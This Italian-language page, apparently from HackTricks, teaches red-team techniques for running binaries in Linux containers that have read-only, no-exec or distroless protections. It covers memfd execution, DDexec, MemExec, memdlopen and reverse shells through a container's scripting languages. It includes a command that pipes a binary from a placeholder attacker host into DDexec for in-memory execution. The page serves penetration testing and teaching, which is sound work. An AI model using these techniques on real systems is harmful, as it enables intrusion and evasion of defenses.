# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Video

Nei seguenti video puoi trovare le tecniche menzionate in questa pagina spiegate più dettagliatamente:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## scenario read-only / no-exec

È sempre più comune trovare macchine Linux con il file system montato con **protezione read-only (ro)**, specialmente nei container. Questo perché eseguire un container con file system ro è semplice quanto impostare **`readOnlyRootFilesystem: true`** nel `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** sarà comunque scrivibile, quindi è falso dire che non possiamo scrivere nulla sul disco. Tuttavia, questa cartella sarà **montata con protezione no-exec**, quindi se scarichi qui un binary **non potrai eseguirlo**.

> [!WARNING]
> Dal punto di vista di una red team, questo rende **complicato scaricare ed eseguire** binary che non sono già presenti nel sistema, come backdoor o enumerator come `kubectl`.

## Bypass più semplice: Scripts

Nota che ho menzionato i binary: puoi **eseguire qualsiasi script** purché l'interpreter sia presente nella macchina, come uno **shell script** se è presente `sh` o uno **script** **Python** se è installato `python`.

Tuttavia, questo non è sufficiente per eseguire la tua backdoor binary o altri binary tool che potresti dover eseguire.

## Bypass della memoria

Se vuoi eseguire un binary ma il file system non lo consente, il modo migliore per farlo è **eseguirlo dalla memoria**, poiché le **protezioni non si applicano** alla memoria.

### Bypass FD + exec syscall

Se nella macchina sono presenti alcuni potenti script engine, come **Python**, **Perl** o **Ruby**, potresti scaricare il binary da eseguire dalla memoria, memorizzarlo in un file descriptor di memoria (`create_memfd` syscall), che non sarà protetto da queste protezioni, e poi chiamare una **`exec` syscall** indicando il **fd come file da eseguire**.

Per farlo puoi usare facilmente il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binary e genererà uno script nel linguaggio indicato con il **binary compresso e codificato in b64**, insieme alle istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la `create_memfd` syscall e a una chiamata alla **exec** syscall per eseguirlo.

> [!WARNING]
> Questo non funziona in altri scripting language come PHP o Node perché non hanno un modo **predefinito per chiamare raw syscall** da uno script, quindi non è possibile chiamare `create_memfd` per creare il **memory fd** in cui memorizzare il binary.
>
> Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, poiché non sarà possibile eseguirlo perché si applicherà la **protezione no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che consente di **modificare la memoria del proprio processo** sovrascrivendo il suo **`/proc/self/mem`**.

Pertanto, **controllando il codice assembly** eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** ti consentirà di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binary** dalla **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per ulteriori informazioni su questa tecnica consulta Github o:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il naturale passo successivo di DDexec. È una **DDexec shellcode demonised**, quindi ogni volta che vuoi **eseguire un binary diverso** non devi rilanciare DDexec: puoi semplicemente eseguire la memexec shellcode tramite la tecnica DDexec e poi **comunicare con questo deamon per passargli nuovi binary da caricare ed eseguire**.

Puoi trovare un esempio su come usare **memexec per eseguire binary da una PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) consente un **modo più semplice per caricare binary** in memoria ed eseguirli successivamente. Potrebbe consentire persino di caricare binary con dipendenze.

## Bypass Distroless

Per una spiegazione dedicata di **che cosa sia realmente distroless**, quando sia utile, quando non lo sia e come cambi le tecniche di post-exploitation nei container, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Che cos'è distroless

I container distroless contengono solo i **componenti minimi indispensabili per eseguire una specifica applicazione o un servizio**, come librerie e dipendenze di runtime, ma escludono componenti più grandi come un package manager, una shell o le system utilities.

L'obiettivo dei container distroless è **ridurre la attack surface dei container eliminando i componenti non necessari** e minimizzando il numero di vulnerabilità che possono essere sfruttate.

### Reverse Shell

In un container distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell normale. Inoltre, non troverai binary come `ls`, `whoami`, `id`... tutto ciò che normalmente esegui in un sistema.

> [!WARNING]
> Pertanto, **non** potrai ottenere una **reverse shell** o **enumerare** il sistema come fai normalmente.

Tuttavia, se il container compromesso esegue, per esempio, una web app Flask, allora Python è installato e puoi quindi ottenere una **Python reverse shell**. Se esegue Node, puoi ottenere una Node rev shell, e lo stesso vale per quasi ogni **linguaggio di scripting**.

> [!TIP]
> Usando il linguaggio di scripting potresti **enumerare il sistema** sfruttando le funzionalità del linguaggio.

Se non sono presenti protezioni **`read-only/no-exec`**, potresti sfruttare la tua reverse shell per **scrivere i tuoi binary nel file system** ed **eseguirli**.

> [!TIP]
> Tuttavia, in questo tipo di container queste protezioni saranno generalmente presenti, ma potresti usare le **tecniche di memory execution precedenti per aggirarle**.

Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **reverse shell** di linguaggi di scripting ed eseguire binary dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
